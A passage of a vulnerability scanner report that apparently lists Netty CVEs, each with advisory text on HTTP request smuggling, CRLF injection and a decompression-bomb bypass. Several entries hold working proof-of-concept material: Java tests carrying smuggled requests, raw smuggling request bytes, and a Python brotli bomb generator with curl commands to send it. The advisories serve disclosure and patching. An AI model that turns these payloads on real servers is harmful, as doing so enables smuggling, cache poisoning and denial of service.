-                        │     │                   2024203274 
-                        │     ├ Title           : Netty allows request-line validation to be bypassed when a
-                        │     │                   `DefaultHtt ... 
-                        │     ├ Description     : Netty allows request-line validation to be bypassed when a
-                        │     │                   `DefaultHttpRequest` or `DefaultFullHttpRequest` is created
-                        │     │                   first and its URI is later changed via `setUri()`. The
-                        │     │                   constructors reject CRLF and whitespace characters that would
-                        │     │                    break the start-line, but `setUri()` does not apply the same
-                        │     │                    validation. `HttpRequestEncoder` and `RtspEncoder` then
-                        │     │                   write the URI into the request line verbatim. If
-                        │     │                   attacker-controlled input reaches `setUri()`, this enables
-                        │     │                   CRLF injection and insertion of additional HTTP or RTSP
-                        │     │                   requests, leading to HTTP request smuggling or
-                        │     │                   desynchronization on the HTTP side and request injection on
-                        │     │                   the RTSP side. This issue is fixed in versions 4.2.13.Final
-                        │     │                   and 4.1.133.Final. 
-                        │     ├ Severity        : MEDIUM 
-                        │     ├ CweIDs           ╭ [0]: CWE-93 
-                        │     │                  ╰ [1]: CWE-444 
-                        │     ├ VendorSeverity   ─ ghsa: 2 
-                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
-                        │     │                         ╰ V3Score : 5.3 
-                        │     ├ References       ╭ [0]: https://github.com/netty/netty 
-                        │     │                  ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA
-                        │     │                         -v8h7-rr48-vmmv 
-                        │     ├ PublishedDate   : 2026-05-06T22:16:25.78Z 
-                        │     ╰ LastModifiedDate: 2026-05-07T15:16:06.703Z 
-                        ├ [5] ╭ VulnerabilityID : CVE-2026-42580 
-                        │     ├ VendorIDs        ─ [0]: GHSA-m4cv-j2px-7723 
-                        │     ├ PkgName         : io.netty:netty-codec-http 
-                        │     ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
-                        │     │                  ╰ UID : 42139b2b89dda2f4 
-                        │     ├ InstalledVersion: 4.2.12.Final 
-                        │     ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
-                        │     │                  │         4edd8ebe468fc57d07e 
-                        │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
-                        │     │                            0961a5292bd158a4dcf 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42580 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:4a1f7648faaae5f2fe2b199fcefea9c71ca19cbe14ae6a3cff79b5
-                        │     │                   6226947af6 
-                        │     ├ Title           : Netty vulnerable to HTTP Request Smuggling due to incorrect
-                        │     │                   chunk size parsing 
-                        │     ├ Description     : ### Summary
-                        │     │                   Netty's chunk size parser silently overflows int, enabling
-                        │     │                   request smuggling attacks.
-                        │     │                   
-                        │     │                   ### Details
-                        │     │                   io.netty.handler.codec.http.HttpObjectDecoder#getChunkSize
-                        │     │                   silently overflows int.
-                        │     │                   The size is accumulated as follows:
-                        │     │                   result *= 16;
-                        │     │                   result += digit;
-                        │     │                   The result is checked only for negative values. However, with
-                        │     │                    a carefully crafted chunk size, the result can be a valid
-                        │     │                   size.
-                        │     │                   ### PoC
-                        │     │                   The test below shows Netty successfully parsing the second
-                        │     │                   request, demonstrating how an attacker can smuggle a second
-                        │     │                   request inside a chunked body.
-                        │     │                   ```java
-                        │     │                   @Test
-                        │     │                   public void test() {
-                        │     │                       String requestStr = "POST / HTTP/1.1\r\n" +
-                        │     │                               "Host: localhost\r\n" +
-                        │     │                               "Transfer-Encoding: chunked\r\n\r\n" +
-                        │     │                               "100000004\r\n" +
-                        │     │                               "test\r\n" +
-                        │     │                               "0\r\n" +
-                        │     │                               "\r\n" +
-                        │     │                               "GET /smuggled HTTP/1.1\r\n" +
-                        │     │                               "Content-Length: 0\r\n" +
-                        │     │                               "\r\n";
-                        │     │                       EmbeddedChannel channel = new EmbeddedChannel(new
-                        │     │                   HttpRequestDecoder());
-                        │     │                      
-                        │     │                   assertTrue(channel.writeInbound(Unpooled.copiedBuffer(request
-                        │     │                   Str, CharsetUtil.US_ASCII)));
-                        │     │                       // Request 1
-                        │     │                       HttpRequest request = channel.readInbound();
-                        │     │                       assertTrue(request.decoderResult().isSuccess());
-                        │     │                       HttpContent content = channel.readInbound();
-                        │     │                       assertTrue(content.decoderResult().isSuccess());
-                        │     │                       assertEquals("test",
-                        │     │                   content.content().toString(CharsetUtil.US_ASCII));
-                        │     │                       content.release();
-                        │     │                       LastHttpContent last = channel.readInbound();
-                        │     │                       assertTrue(last.decoderResult().isSuccess());
-                        │     │                       last.release();
-                        │     │                       // Request 2
-                        │     │                       request = channel.readInbound();
-                        │     │                       last = channel.readInbound();
-                        │     │                   }
-                        │     │                   ```
-                        │     │                   ### Impact
-                        │     │                   HTTP Request Smuggling: Attacker injects arbitrary HTTP
-                        │     │                   requests 
-                        │     ├ Severity        : MEDIUM 
-                        │     ├ VendorSeverity   ─ ghsa: 2 
-                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L 
-                        │     │                         ╰ V3Score : 6.5 
-                        │     ╰ References       ╭ [0]: https://github.com/netty/netty 
-                        │                        ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA
-                        │                               -m4cv-j2px-7723 
-                        ├ [6] ╭ VulnerabilityID : CVE-2026-42581 
-                        │     ├ VendorIDs        ─ [0]: GHSA-xxqh-mfjm-7mv9 
-                        │     ├ PkgName         : io.netty:netty-codec-http 
-                        │     ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
-                        │     │                  ╰ UID : 42139b2b89dda2f4 
-                        │     ├ InstalledVersion: 4.2.12.Final 
-                        │     ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
-                        │     │                  │         4edd8ebe468fc57d07e 
-                        │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
-                        │     │                            0961a5292bd158a4dcf 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42581 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:e06e8aca9203849f5db02e2419dd256a6f1f2ce2ba486922754dbf
-                        │     │                   2c20029b19 
-                        │     ├ Title           : Netty HTTP/1.0 TE+CL Coexistence Bypasses Smuggling
-                        │     │                   Sanitization 
-                        │     ├ Description     : # NETTY HTTP/1.0 TE+CL Coexistence Bypasses Smuggling
-                        │     │                   Sanitization
-                        │     │                   
-                        │     │                   | Field     | Value |
-                        │     │                   |-----------|-------|
-                        │     │                   | Library   | `io.netty:netty-codec-http` |
-                        │     │                   | Component | `codec-http` — `HttpObjectDecoder` |
-                        │     │                   | Severity  | **HIGH** |
-                        │     │                   | Affects   | HEAD, commit `4f3533ae` confirmed |
-                        │     │                   ---
-                        │     │                   ## Summary
-                        │     │                   `HttpObjectDecoder` strips a conflicting `Content-Length`
-                        │     │                   header when a request carries both `Transfer-Encoding:
-                        │     │                   chunked` and `Content-Length`, but only for HTTP/1.1
-                        │     │                   messages. The guard is absent for HTTP/1.0. An attacker that
-                        │     │                   sends an HTTP/1.0 request with both headers causes Netty to
-                        │     │                   decode the body as chunked while leaving `Content-Length`
-                        │     │                   intact in the forwarded `HttpMessage`. Any downstream proxy
-                        │     │                   or handler that trusts `Content-Length` over
-                        │     │                   `Transfer-Encoding` will disagree on message boundaries,
-                        │     │                   enabling request smuggling.
-                        │     │                   ## Root Cause
-                        │     │                   ```java
-                        │     │                   // HttpObjectDecoder.java:828-833
-                        │     │                   if (HttpUtil.isTransferEncodingChunked(message)) {
-                        │     │                       this.chunked = true;
-                        │     │                       if (!contentLengthFields.isEmpty() &&
-                        │     │                   message.protocolVersion() == HttpVersion.HTTP_1_1) {
-                        │     │                          
-                        │     │                   handleTransferEncodingChunkedWithContentLength(message);  //
-                        │     │                   strips CL — HTTP/1.1 only
-                        │     │                       }
-                        │     │                       return State.READ_CHUNK_SIZE;
-                        │     │                   }
-                        │     │                   // HttpObjectDecoder.java:870-873
-                        │     │                   protected void
-                        │     │                   handleTransferEncodingChunkedWithContentLength(HttpMessage
-                        │     │                   message) {
-                        │     │                      
-                        │     │                   message.headers().remove(HttpHeaderNames.CONTENT_LENGTH);
-                        │     │                       contentLength = Long.MIN_VALUE;
-                        │     │                   ```
-                        │     │                   The conflict-resolution path is gated on
-                        │     │                   `message.protocolVersion() == HttpVersion.HTTP_1_1`. When the
-                        │     │                    request declares `HTTP/1.0`, the condition is false,
-                        │     │                   `handleTransferEncodingChunkedWithContentLength` is never
-                        │     │                   called, and the `Content-Length` header survives into the
-                        │     │                   forwarded message. Netty still processes the body as chunked;
-                        │     │                    a downstream component that is CL-first interprets the same
-                        │     │                   bytes as a separate request.
-                        │     │                   ## Proof of Concept
-                        │     │                   POST /api HTTP/1.0\r\n
-                        │     │                   Host: internal.example.com\r\n
-                        │     │                   Transfer-Encoding: chunked\r\n
-                        │     │                   Content-Length: 0\r\n
-                        │     │                   \r\n
-                        │     │                   5\r\n
-                        │     │                   GPOST\r\n
-                        │     │                   0\r\n
-                        │     │                   Netty consumes the full chunked body (5 bytes + terminator).
-                        │     │                   A downstream CL-first proxy reads `Content-Length: 0`,
-                        │     │                   considers the request complete at the blank line, and treats
-                        │     │                   `5\r\nGPOST\r\n0\r\n\r\n` as the start of a second request.
-                        │     │                   ## Conditions Required
-                        │     │                   1. Netty is deployed behind a reverse proxy or load balancer
-                        │     │                   that is `Content-Length`-first (nginx, some HAProxy configs,
-                        │     │                   AWS ALB in certain modes).
-                        │     │                   2. Attacker can send HTTP/1.0 requests (either directly or by
-                        │     │                    downgrading via connection manipulation).
-                        │     │                   3. No additional HTTP/1.0 stripping layer between attacker
-                        │     │                   and Netty.
-                        │     │                   ## Impact
-                        │     │                   Request smuggling at the Netty edge. Allows cache poisoning,
-                        │     │                   session fixation against other users, unauthorized access to
-                        │     │                   internal endpoints, and bypassing of WAF or authentication
-                        │     │                   layers that inspect only the first logical request.
-                        │     │                   ## Confirmed PoC Test
-                        │     │                   Verified against HEAD (`4f3533ae`) using `EmbeddedChannel`.
-                        │     │                   Both tests pass, confirming the vulnerability and the
-                        │     │                   HTTP/1.1 contrast.
-                        │     │                   package io.netty.handler.codec.http;
-                        │     │                   import io.netty.buffer.Unpooled;
-                        │     │                   import io.netty.channel.embedded.EmbeddedChannel;
-                        │     │                   import io.netty.util.CharsetUtil;
-                        │     │                   import org.junit.jupiter.api.Test;
-                        │     │                   import static org.junit.jupiter.api.Assertions.*;
-                        │     │                   public class NettySmugglingSec001Test {
-                        │     │                       // VULNERABLE: Content-Length survives in HTTP/1.0 TE+CL
-                        │     │                   conflict
-                        │     │                       @Test
-                        │     │                       public void http10_contentLengthNotStripped() {
-                        │     │                           EmbeddedChannel ch = new EmbeddedChannel(new
-                        │     │                   HttpRequestDecoder());
-                        │     │                           ch.writeInbound(Unpooled.copiedBuffer(
-                        │     │                                   "POST /api HTTP/1.0\r\n" +
-                        │     │                                   "Transfer-Encoding: chunked\r\n" +
-                        │     │                                   "Content-Length: 0\r\n" +
-                        │     │                                   "\r\n" +
-                        │     │                                   "5\r\nGPOST\r\n0\r\n\r\n",
-                        │     │                   CharsetUtil.US_ASCII));
-                        │     │                           HttpRequest req = ch.readInbound();
-                        │     │                           assertEquals(HttpVersion.HTTP_1_0,
-                        │     │                   req.protocolVersion());
-                        │     │                           // Content-Length: 0 survives — downstream CL-first
-                        │     │                   proxy treats chunked body as new request
-                        │     │                   assertNotNull(req.headers().get(HttpHeaderNames.CONTENT_LENGT
-                        │     │                   H), "VULNERABLE: CL not stripped");
-                        │     │                           ch.finishAndReleaseAll();
-                        │     │                       // SAFE: HTTP/1.1 correctly strips Content-Length on
-                        │     │                   TE+CL conflict
-                        │     │                       public void http11_contentLengthStripped() {
-                        │     │                                   "POST /api HTTP/1.1\r\n" +
-                        │     │                   assertNull(req.headers().get(HttpHeaderNames.CONTENT_LENGTH),
-                        │     │                    "SAFE: CL correctly stripped");
-                        │     │                   ## Fix Guidance
-                        │     │                   Remove the `message.protocolVersion() ==
-                        │     │                   HttpVersion.HTTP_1_1` guard in `HttpObjectDecoder`, applying
-                        │     │                   `handleTransferEncodingChunkedWithContentLength`
-                        │     │                   unconditionally whenever both `Transfer-Encoding: chunked`
-                        │     │                   and `Content-Length` are present, regardless of protocol
-                        │     │                   version. 
-                        │     ├ Severity        : MEDIUM 
-                        │     ├ VendorSeverity   ─ ghsa: 2 
-                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N 
-                        │     │                         ╰ V3Score : 5.8 
-                        │     ╰ References       ╭ [0]: https://github.com/netty/netty 
-                        │                        ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA
-                        │                               -xxqh-mfjm-7mv9 
-                        ├ [7] ╭ VulnerabilityID : CVE-2026-42585 
-                        │     ├ VendorIDs        ─ [0]: GHSA-38f8-5428-x5cv 
-                        │     ├ PkgName         : io.netty:netty-codec-http 
-                        │     ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
-                        │     │                  ╰ UID : 42139b2b89dda2f4 
-                        │     ├ InstalledVersion: 4.2.12.Final 
-                        │     ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
-                        │     │                  │         4edd8ebe468fc57d07e 
-                        │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
-                        │     │                            0961a5292bd158a4dcf 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42585 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:7419c9f0809b4d7e52fd6bbce26d4f255f44b83b5136f21b64c63e
-                        │     │                   f1e5207783 
-                        │     ├ Title           : Netty vulnerable to HTTP Request Smuggling due to malformed
-                        │     │                   Transfer-Encoding 
-                        │     ├ Description     : ### Summary
-                        │     │                   Netty incorrectly parses malformed Transfer-Encoding,
-                        │     │                   enabling request smuggling attacks.
-                        │     │                   
-                        │     │                   ### Details
-                        │     │                   Netty incorrectly marks a request as chunked when malformed
-                        │     │                   "Transfer-Encoding: chunked, identity" is present.
-                        │     │                   According to RFC
-                        │     │                   https://datatracker.ietf.org/doc/html/rfc9112#name-message-bo
-                        │     │                   dy-length
-                        │     │                   "
-                        │     │                   If a Transfer-Encoding header field is present in a request
-                        │     │                   and the chunked transfer coding is not the final encoding,
-                        │     │                    the message body length cannot be determined reliably; the
-                        │     │                   server MUST respond with the 400 (Bad Request)
-                        │     │                    status code and then close the connection.
-                        │     │                   A possible scenario is when Netty is behind a proxy that
-                        │     │                   doesn't reject requests with "Transfer-Encoding: chunked,
-                        │     │                   identity", but prefers "Content-Length" and forwards the
-                        │     │                   content to Netty.
-                        │     │                   ### PoC
-                        │     │                   The test below shows Netty successfully parsing the second
-                        │     │                   request, demonstrating how an attacker can smuggle a second
-                        │     │                   request inside a request body.
-                        │     │                   ```java
-                        │     │                   @Test
-                        │     │                       public void test() {
-                        │     │                           String requestStr = "POST / HTTP/1.1\r\n" +
-                        │     │                                   "Host: localhost\r\n" +
-                        │     │                                   "Transfer-Encoding: chunked, identity\r\n" +
-                        │     │                                   "Content-Length: 48\r\n" +
-                        │     │                                   "\r\n" +
-                        │     │                                   "0\r\n" +
-                        │     │                                   "GET /smuggled HTTP/1.1\r\n" +
-                        │     │                                   "\r\n";
-                        │     │                           EmbeddedChannel channel = new EmbeddedChannel(new
-                        │     │                   HttpRequestDecoder());
-                        │     │                          
-                        │     │                   assertTrue(channel.writeInbound(Unpooled.copiedBuffer(request
-                        │     │                   Str, CharsetUtil.US_ASCII)));
-                        │     │                           // Request 1
-                        │     │                           HttpRequest request = channel.readInbound();
-                        │     │                           assertTrue(request.decoderResult().isSuccess());
-                        │     │                   assertTrue(request.headers().contains("Transfer-Encoding"));
-                        │     │                   assertFalse(request.headers().contains("Content-Length"));
-                        │     │                           LastHttpContent last = channel.readInbound();
-                        │     │                           assertTrue(last.decoderResult().isSuccess());
-                        │     │                           last.release();
-                        │     │                           // Request 2
-                        │     │                           request = channel.readInbound();
-                        │     │                           last = channel.readInbound();
-                        │     │                       }
-                        │     │                   ```
-                        │     │                   ### Impact
-                        │     │                   HTTP Request Smuggling: Attacker injects arbitrary HTTP
-                        │     │                   requests 
-                        │     ├ Severity        : MEDIUM 
-                        │     ├ VendorSeverity   ─ ghsa: 2 
-                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N 
-                        │     │                         ╰ V3Score : 6.5 
-                        │     ╰ References       ╭ [0]: https://datatracker.ietf.org/doc/html/rfc9112#name-mess
-                        │                        │      age-body-length 
-                        │                        ├ [1]: https://github.com/netty/netty 
-                        │                        ╰ [2]: https://github.com/netty/netty/security/advisories/GHSA
-                        │                               -38f8-5428-x5cv 
-                        ├ [8] ╭ VulnerabilityID : CVE-2026-42587 
-                        │     ├ VendorIDs        ─ [0]: GHSA-f6hv-jmp6-3vwv 
-                        │     ├ PkgName         : io.netty:netty-codec-http2 
-                        │     ├ PkgPath         : openaf/Kube/netty-codec-http2-4.2.12.Final.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http2@4.2.12.Final 
-                        │     │                  ╰ UID : c9374114bd085c75 
-                        │     ├ InstalledVersion: 4.2.12.Final 
-                        │     ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
-                        │     │                  │         4edd8ebe468fc57d07e 
-                        │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
-                        │     │                            0961a5292bd158a4dcf 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42587 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:ef9815ae7a94903bd25f8c10fe8311c41be84c2034ee55de815139
-                        │     │                   11ed991da4 
-                        │     ├ Title           : Netty: HttpContentDecompressor maxAllocation bypass when
-                        │     │                   Content-Encoding set to br/zstd/snappy leads to decompression
-                        │     │                    bomb DoS 
-                        │     ├ Description     : ## Summary
-                        │     │                   
-                        │     │                   `HttpContentDecompressor` accepts a `maxAllocation` parameter
-                        │     │                    to limit decompression buffer size and prevent decompression
-                        │     │                    bomb attacks. This limit is correctly enforced for gzip and
-                        │     │                   deflate encodings via `ZlibDecoder`, but is silently ignored
-                        │     │                   when the content encoding is `br` (Brotli), `zstd`, or
-                        │     │                   `snappy`. An attacker can bypass the configured decompression
-                        │     │                    limit by sending a compressed payload with
-                        │     │                   `Content-Encoding: br` instead of `Content-Encoding: gzip`,
-                        │     │                   causing unbounded memory allocation and out-of-memory denial
-                        │     │                   of service.
-                        │     │                   The same vulnerability exists in
-                        │     │                   `DelegatingDecompressorFrameListener` for HTTP/2
-                        │     │                   connections.
-                        │     │                   ## Details
-                        │     │                   `HttpContentDecompressor` stores the `maxAllocation` value at
-                        │     │                    construction time (`HttpContentDecompressor.java:89`) and
-                        │     │                   uses it in `newContentDecoder()` to create the appropriate
-                        │     │                   decompression handler.
-                        │     │                   For gzip/deflate, `maxAllocation` is forwarded to
-                        │     │                   `ZlibCodecFactory.newZlibDecoder()`:
-                        │     │                   ```java
-                        │     │                   // HttpContentDecompressor.java:101 — maxAllocation IS
-                        │     │                   enforced
-                        │     │                   .handlers(ZlibCodecFactory.newZlibDecoder(ZlibWrapper.GZIP,
-                        │     │                   maxAllocation))
-                        │     │                   ```
-                        │     │                   `ZlibDecoder.prepareDecompressBuffer()` enforces this as a
-                        │     │                   hard cap by setting the buffer's `maxCapacity` and throwing
-                        │     │                   `DecompressionException` when the limit is reached:
-                        │     │                   // ZlibDecoder.java:68 — hard limit on buffer capacity
-                        │     │                   return ctx.alloc().heapBuffer(Math.min(preferredSize,
-                        │     │                   maxAllocation), maxAllocation);
-                        │     │                   // ZlibDecoder.java:80 — throws when exceeded
-                        │     │                   throw new DecompressionException("Decompression buffer has
-                        │     │                   reached maximum size: " + buffer.maxCapacity());
-                        │     │                   For brotli, zstd, and snappy, the decoders are created
-                        │     │                   without any size limit:
-                        │     │                   // HttpContentDecompressor.java:120 — maxAllocation IGNORED
-                        │     │                   .handlers(new BrotliDecoder())
-                        │     │                   // HttpContentDecompressor.java:129 — maxAllocation IGNORED
-                        │     │                   .handlers(new SnappyFrameDecoder())
-                        │     │                   // HttpContentDecompressor.java:138 — maxAllocation IGNORED
-                        │     │                   .handlers(new ZstdDecoder())
-                        │     │                   `BrotliDecoder` has no `maxAllocation` parameter at all —
-                        │     │                   there is no way to constrain its output. It streams
-                        │     │                   decompressed data in chunks via `fireChannelRead` with no
-                        │     │                   total limit.
-                        │     │                   `ZstdDecoder()` defaults to a 4MB `maximumAllocationSize`,
-                        │     │                   but this only constrains individual buffer allocations, not
-                        │     │                   total output. The decode loop (`ZstdDecoder.java:100-114`)
-                        │     │                   creates new buffers and fires `channelRead` repeatedly, so
-                        │     │                   total decompressed output is unbounded.
-                        │     │                   The identical pattern exists in
-                        │     │                   `DelegatingDecompressorFrameListener.newContentDecompressor()
-                        │     │                   ` at lines 188-210 for HTTP/2.
-                        │     │                   ## PoC
-                        │     │                   1. Configure a Netty HTTP server with decompression bomb
-                        │     │                   protection:
-                        │     │                   pipeline.addLast(new HttpContentDecompressor(1048576)); //
-                        │     │                   1MB max
-                        │     │                   pipeline.addLast(new HttpObjectAggregator(1048576));     //
-                        │     │                   2. Generate a brotli-compressed bomb (~1KB compressed → 1GB
-                        │     │                   decompressed):
-                        │     │                   ```python
-                        │     │                   import brotli
-                        │     │                   bomb = b'\x00' * (1024 * 1024 * 1024)  # 1GB of zeros
-                        │     │                   compressed = brotli.compress(bomb, quality=11)
-                        │     │                   with open('bomb.br', 'wb') as f:
-                        │     │                       f.write(compressed)
-                        │     │                   # compressed size: ~1KB
-                        │     │                   3. Send the bomb with gzip encoding (BLOCKED by
-                        │     │                   maxAllocation):
-                        │     │                   ```bash
-                        │     │                   # This is caught — ZlibDecoder enforces the 1MB limit
-                        │     │                   curl -X POST http://target:8080/api \
-                        │     │                     -H 'Content-Encoding: gzip' \
-                        │     │                     --data-binary @bomb.gz
-                        │     │                   # Result: DecompressionException thrown at 1MB
-                        │     │                   4. Send the same bomb with brotli encoding (BYPASSES
-                        │     │                   # This bypasses the limit — BrotliDecoder has no
-                        │     │                   maxAllocation
-                        │     │                     -H 'Content-Encoding: br' \
-                        │     │                     --data-binary @bomb.br
-                        │     │                   # Result: Full 1GB decompressed into memory → OOM
-                        │     │                   5. The same bypass works with `Content-Encoding: zstd` and
-                        │     │                   `Content-Encoding: snappy`.
-                        │     │                   ## Impact
-                        │     │                   - **Denial of Service**: An attacker can cause out-of-memory
-                        │     │                   conditions on any Netty server that relies on `maxAllocation`
-                        │     │                    for decompression bomb protection, by simply using a
-                        │     │                   non-gzip content encoding.
-                        │     │                   - **False sense of security**: Developers who explicitly
-                        │     │                   configure `maxAllocation` to protect against decompression
-                        │     │                   bombs are not actually protected for brotli, zstd, or snappy
-                        │     │                   encodings. The API documentation implies all encodings are
-                        │     │                   covered.
-                        │     │                   - **Trivial bypass**: The attacker only needs to change one
-                        │     │                   HTTP header (`Content-Encoding: br` instead of
-                        │     │                   `Content-Encoding: gzip`) to circumvent the protection
-                        │     │                   entirely.
-                        │     │                   - **Both HTTP/1.1 and HTTP/2**: The vulnerability exists in
-                        │     │                   both `HttpContentDecompressor` (HTTP/1.1) and
-                        │     │                   `DelegatingDecompressorFrameListener` (HTTP/2).
-                        │     │                   ## Recommended Fix
-                        │     │                   Pass `maxAllocation` to all decoder constructors. For
-                        │     │                   `BrotliDecoder`, which currently has no `maxAllocation`
-                        │     │                   support, add the parameter:
-                        │     │                   **HttpContentDecompressor.java** — pass maxAllocation to all
-                        │     │                   decoders:
-                        │     │                   // Line 120: BrotliDecoder — add maxAllocation support
-                        │     │                   .handlers(new BrotliDecoder(maxAllocation))
-                        │     │                   // Line 129: SnappyFrameDecoder — add maxAllocation support
-                        │     │                   .handlers(new SnappyFrameDecoder(maxAllocation))
-                        │     │                   // Line 138: ZstdDecoder — forward the configured
-                        │     │                   .handlers(new ZstdDecoder(maxAllocation))
-                        │     │                   **DelegatingDecompressorFrameListener.java** — same fix at
-                        │     │                   lines 188-210.
-                        │     │                   **BrotliDecoder** — add `maxAllocation` parameter with the
-                        │     │                   same semantics as `ZlibDecoder.prepareDecompressBuffer()`:
-                        │     │                   set buffer maxCapacity and throw `DecompressionException`
-                        │     │                   when the total decompressed output exceeds the limit.
-                        │     │                   **SnappyFrameDecoder** — add `maxAllocation` parameter with
-                        │     │                   equivalent enforcement.
-                        │     │                   **ZstdDecoder** — ensure that when `maxAllocation` is set,
-                        │     │                   total output across all buffers is bounded (not just
-                        │     │                   per-buffer allocation size). 
-                        │     ├ Severity        : HIGH 
-                        │     ├ VendorSeverity   ─ ghsa: 3 
-                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
-                        │     │                         ╰ V3Score : 7.5 
-                        │     ╰ References       ╭ [0]: https://github.com/netty/netty 
-                        │                        ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA
-                        │                               -f6hv-jmp6-3vwv 
-                        ╰ [9] ╭ VulnerabilityID : CVE-2026-42578 
-                              ├ VendorIDs        ─ [0]: GHSA-45q3-82m4-75jr 
-                              ├ PkgName         : io.netty:netty-handler-proxy 
-                              ├ PkgPath         : openaf/Kube/netty-handler-proxy-4.2.12.Final.jar 
-                              ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-handler-proxy@4.2.12.Final 
-                              │                  ╰ UID : 8344d1e8c7524c10 
-                              ├ InstalledVersion: 4.2.12.Final 
-                              ├ FixedVersion    : 4.1.133.Final, 4.2.13.Final 
-                              ├ Status          : fixed 
-                              ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
-                              │                  │         4edd8ebe468fc57d07e 
-                              │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
-                              │                            0961a5292bd158a4dcf 
-                              ├ SeveritySource  : ghsa 
-                              ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42578 
-                              ├ DataSource       ╭ ID  : ghsa 
-                              │                  ├ Name: GitHub Security Advisory Maven 
-                              │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                              │                          osystem%3Amaven 
-                              ├ Fingerprint     : sha256:abd51ae1d37b71a2b0d1e0382a01595512c746d45ef85bfe84b3a4
-                              │                   88cbcb55da 
-                              ├ Title           : Netty has HTTP Header Injection via HttpProxyHandler Disabled
-                              │                    Validation (Incomplete Fix CVE-2025-67735) 
-                              ├ Description     : # Security Vulnerability Report: HTTP Header Injection via
-                              │                   HttpProxyHandler Disabled Validation in Netty
-                              │                   
-                              │                   ## 1. Vulnerability Summary
-                              │                   | Field | Value |
-                              │                   |-------|-------|
-                              │                   | **Product** | Netty |
-                              │                   | **Version** | 4.2.12.Final (and all prior versions) |
-                              │                   | **Component** | `io.netty.handler.proxy.HttpProxyHandler`
-                              │                   |
-                              │                   | **Vulnerability Type** | CWE-113: Improper Neutralization
-                              │                   of CRLF Sequences in HTTP Headers |
-                              │                   | **Impact** | HTTP Header Injection in CONNECT Proxy
-                              │                   Requests |
-                              │                   | **CVSS 3.1 Score** | **7.5 (High)** |
-                              │                   | **CVSS 3.1 Vector** |
-                              │                   `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
-                              │                   | **Related Advisory** | **GHSA-84h7-rjj3-6jx4** (Incomplete
-                              │                   Fix) |
-                              │                   ## 2. Affected Components
